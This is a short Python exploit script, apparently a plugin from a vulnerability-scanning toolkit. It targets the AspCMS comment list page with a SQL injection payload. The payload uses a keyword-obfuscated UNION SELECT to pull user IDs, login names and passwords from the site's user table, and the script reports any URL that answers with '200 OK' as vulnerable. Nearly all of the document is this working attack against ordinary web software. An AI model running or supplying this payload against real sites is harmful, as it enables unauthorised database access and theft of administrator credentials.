#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload = '/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user'
bug ="200 OK"
info ="aspcms_sql注入"
qian ='<div class="line2">'
hou ="</div>"
qiant ="评论者："
hout ="IP："


def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[1].find(bug)!= -1:
        print(Result+url+info);#,"账号:".GettextMiddle(res[0],qiant,hout),"密码:".GettextMiddle(res[0],qian,hou)


main()
